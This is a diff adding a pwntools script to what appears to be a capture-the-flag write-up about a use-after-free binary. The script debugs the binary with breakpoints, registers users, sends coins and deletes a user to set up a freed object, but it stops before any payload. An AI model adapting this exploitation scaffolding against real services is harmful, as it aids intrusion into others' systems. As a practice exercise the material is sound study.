@@ -440,8 +440,89 @@ ___
 
 ___
 `script.py`:
+````python
+from pwn import *
 
+libc = ELF("./libc.2.23.so", checksec=False)
 
+context.binary = exe = ELF("./pwn3_uaf_patched", checksec=False)
+context.log_level = "debug"
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		handle SIGALRM ignore
+		# register
+		br *0x400b0f
+		br *0x400bf7
+		br *0x400c38
+		br *0x400d6d
+
+		# send_coin
+		br *0x4010ec
+		br *0x40119d
+		br *0x401260
+
+		# delete
+		br *0x401423
+		br *0x4012a0
+		br *0x4014b6
+		br *0x4014c4
+		br *0x4014d0
+
+		br *0x401717
+		''')
+
+p = process(exe.path)
+GDB()
+
+def register(username, password):
+	p.sendlineafter(b">", b'1')
+	p.sendlineafter(b">", username)
+	p.sendlineafter(b">", password)
+	p.sendlineafter(b">", password)
+
+def login(username, password):
+	p.sendlineafter(b">", b'2')
+	p.sendlineafter(b">", username)
+	p.sendlineafter(b">", password)
+
+### After login ###
+def displayInfo():
+	p.sendlineafter(b">", b'1')
+
+def sendCoin(username, amount):
+	p.sendlineafter(b">", b'2')
+	p.sendlineafter(b">", username)
+	p.sendlineafter(b">", amount)
+
+def displayTransaction():
+	p.sendlineafter(b">", b'3')
+
+def changePass(password):
+	p.sendlineafter(b">", b'4')
+	p.sendlineafter(b">", password)
+
+def deleteUser():
+	p.sendlineafter(b">", b'5')
+### Exit ###
+
+register(b"Long", b"Long")
+register(b"Le", b"Le")
+
+login(b"Long", b"Long")
+
+displayInfo()
+displayTransaction()
+
+sendCoin(b"Le", b"200")
+
+displayInfo()
+displayTransaction()
+
+deleteUser()
+
+p.interactive()
+````
 ___
 
 
